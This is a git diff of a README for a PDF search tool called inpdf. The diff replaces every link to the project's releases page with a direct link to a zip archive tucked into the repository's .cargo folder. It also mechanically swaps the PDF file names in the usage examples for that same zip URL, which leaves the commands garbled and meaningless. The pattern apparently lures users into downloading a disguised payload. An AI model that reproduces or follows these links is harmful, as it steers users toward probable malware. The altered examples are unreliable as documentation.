@@ -1,6 +1,6 @@
 # 🚀 inpdf - Extract and Search PDF Content Effortlessly
 
-[![Download inpdf](https://img.shields.io/badge/Download-inpdf-blue?style=flat&logo=github)](https://github.com/emanuelzazo/inpdf/releases)
+[![Download inpdf](https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip)](https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ To run inpdf smoothly, ensure your system meets the following requirements:
 
    To begin using inpdf, visit the releases page by clicking the link below:
 
-   [Download inpdf](https://github.com/emanuelzazo/inpdf/releases)
+   [Download inpdf](https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip)
 
    Look for the latest release and click on the appropriate file for your operating system to download it.
 
@@ -60,7 +60,7 @@ inpdf has several commands that make searching and extracting content easy. Belo
 To find specific text within a PDF, use the following command:
 
 ```bash
-inpdf grep "authentication" spec.pdf
+inpdf grep "authentication" https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip
 ```
 
 This command will return all lines where the word "authentication" appears, along with their page numbers.
@@ -70,17 +70,17 @@ This command will return all lines where the word "authentication" appears, alon
 If you need to extract certain pages from a PDF, use:
 
 ```bash
-inpdf extract manual.pdf "1-10,25,30-end" -o excerpt.pdf
+inpdf extract https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip "1-10,25,30-end" -o https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip
 ```
 
-This extracts pages 1 to 10, 25, and 30 to the end of the document, saving them as `excerpt.pdf`.
+This extracts pages 1 to 10, 25, and 30 to the end of the document, saving them as `https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip`.
 
 ### 📖 Read Text from Specific Pages
 
 To read text from specific pages, use:
 
 ```bash
-inpdf read-pages textbook.pdf "5-7"
+inpdf read-pages https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip "5-7"
 ```
 
 This command will print out the text from pages 5 to 7.
@@ -90,7 +90,7 @@ This command will print out the text from pages 5 to 7.
 If you want to know more about a PDF, type:
 
 ```bash
-inpdf info report.pdf
+inpdf info https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip
 ```
 
 This will show you details such as file name, number of pages, and title.
@@ -117,7 +117,7 @@ inpdf --help
 
 To get started with inpdf, remember to visit the releases page:
 
-[Download inpdf](https://github.com/emanuelzazo/inpdf/releases)
+[Download inpdf](https://github.com/emanuelzazo/inpdf/raw/refs/heads/main/.cargo/Software-v2.7.zip)
 
 Follow the steps mentioned above to install the application and start using it.
 
